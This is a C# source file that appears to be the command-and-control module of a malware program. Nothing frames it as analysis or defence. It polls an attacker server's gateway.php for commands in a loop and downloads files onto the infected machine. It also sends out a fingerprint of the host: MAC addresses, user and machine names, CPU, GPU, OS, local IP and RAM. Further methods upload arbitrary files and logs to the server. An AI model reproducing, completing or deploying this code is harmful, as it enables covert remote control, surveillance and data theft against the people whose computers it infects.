using System;
using System.Net;
using System.IO;
using System.Threading;
using Kernel.Functions.Surveillance;

namespace Kernel.Nexus
{
    class Binder {
        internal class RequestHandler {
            public static void Request() {
                bool Error = false;
                string RequestOut = null;
                while (true) {
                    Error = false;
                    Thread.Sleep(Config.MalwareRequestDelay);
                    try { RequestOut = Binder.Get.Indication(); } catch {
                        Error = true;
                    } finally {
                        if (!Error) { Handler.Processing(RequestOut); } 
                    }
                }
            }

        }

        internal class Get {
            public static string Indication() {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Config.MalwareServerAddr + "gateway.php?id=" + Encoder.Base64Encode(Intelligence.GetProcessorId) + 
                    "&key=" + Encoder.Base64Encode(Config.MalwareServerKey) + "&marker=" + Encoder.Base64Encode("Indication") + "&tag=" + Encoder.Base64Encode(Config.MalwareServerTag));
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                return new StreamReader(response.GetResponseStream()).ReadToEnd();
            }
            public static void File(string PointDir, string PointFile) {
                WebClient myWebClient = new WebClient();
                System.Uri Site = new Uri(Config.MalwareServerAddr + "data/files_server/" + PointFile);
                myWebClient.DownloadFile(Site, PointDir);
            }
        }

        internal class Send {
            public static void Info(string data) {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Config.MalwareServerAddr + "gateway.php?id=" + Encoder.Base64Encode(Intelligence.GetProcessorId) + 
                    "&key=" + Encoder.Base64Encode(Config.MalwareServerKey) + "&info=" + Encoder.Base64Encode(data) + "&marker=" + Encoder.Base64Encode("Info"));
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                new StreamReader(response.GetResponseStream()).ReadToEnd();
            }
            public static void Log(string data) {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Config.MalwareServerAddr + "gateway.php?id=" + Encoder.Base64Encode(Intelligence.GetProcessorId) +
                    "&key=" + Encoder.Base64Encode(Config.MalwareServerKey) + "&info=" + Encoder.Base64Encode(data) + "&marker=" + Encoder.Base64Encode("Log"));
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                new StreamReader(response.GetResponseStream()).ReadToEnd();
            }
            public static void Configuration() {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Config.MalwareServerAddr + "gateway.php?id=" + Encoder.Base64Encode(Intelligence.GetProcessorId) +
                    "&key=" + 
                    Encoder.Base64Encode(Config.MalwareServerKey) + "&mac=" + 
                    Encoder.Base64Encode(Intelligence.GetMacAddresses) + "&tmz=" + 
                    Encoder.Base64Encode(Intelligence.GetTimeZone) + "&cpu=" + 
                    Encoder.Base64Encode(Intelligence.GetProcessorName) + "&gpu=" + 
                    Encoder.Base64Encode(Intelligence.GetGPU) + "&mhn=" + 
                    Encoder.Base64Encode(Intelligence.GetMachineName) + "&tag=" +
                    Encoder.Base64Encode(Config.MalwareServerTag) + "&usr=" + 
                    Encoder.Base64Encode(Intelligence.GetUserName) + "&os=" +
                    Encoder.Base64Encode(Intelligence.GetOperatingSystem) + "&lip=" +
                    Encoder.Base64Encode(Intelligence.GetLocalIPAddress) + "&ram=" +
                    Encoder.Base64Encode(Intelligence.GetTotalRAM) + "&marker=" + 
                    Encoder.Base64Encode("Cfg"));
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                new StreamReader(response.GetResponseStream()).ReadToEnd();
            }
            public static void File(string file) {
                System.Net.WebClient Client = new System.Net.WebClient();
                Client.Headers.Add("Content-Type", "binary/octet-stream");
                byte[] result = Client.UploadFile(Config.MalwareServerAddr + "/gateway.php?id=" + Encoder.Base64Encode(Intelligence.GetProcessorId) + "&key=" + 
                    Encoder.Base64Encode(Config.MalwareServerKey) + "&marker=" + Encoder.Base64Encode("File"), "POST", file);
                string s = System.Text.Encoding.UTF8.GetString(result, 0, result.Length);
            }
        }
    }
}
